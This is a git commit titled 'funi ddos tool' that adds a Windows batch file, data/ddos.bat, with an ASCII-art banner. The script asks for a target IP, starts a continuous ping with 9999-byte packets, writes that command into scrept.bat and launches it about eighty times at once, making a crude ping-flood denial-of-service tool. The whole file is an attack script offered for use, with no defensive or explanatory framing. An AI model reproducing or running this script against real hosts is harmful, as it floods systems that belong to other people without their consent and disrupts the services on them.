929081452668e384a4e2016587babf4ed3304363
Kroefer <104503666+Kroefer@users.noreply.github.com>
2024-01-27 13:52:35 +0100

    funi ddos tool

---
+++ data/ddos.bat
@@ -0,0 +1,101 @@
+@echo off
+title epik ddos tool
+color 4
+:::
+:::             _ _          _     _             _              _ 
+:::            (_) |        | |   | |           | |            | |
+:::   ___ _ __  _| | __   __| | __| | ___  ___  | |_ ___   ___ | |
+:::  / _ \ '_ \| | |/ /  / _` |/ _` |/ _ \/ __| | __/ _ \ / _ \| |
+::: |  __/ |_) | |   <  | (_| | (_| | (_) \__ \ | || (_) | (_) | |
+:::  \___| .__/|_|_|\_\  \__,_|\__,_|\___/|___/  \__\___/ \___/|_|
+:::      | |                                                      
+:::      |_|                                                      
+:::                                  
+::: this is the worst ddos tool available
+:::
+@for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
+set /p ip= Enter ip: 
+
+ping -l 9999 %ip% -t
+echo ping -l 9999 %ip% -t.>> scrept.bat >nul
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+start scrept.bat
+pause
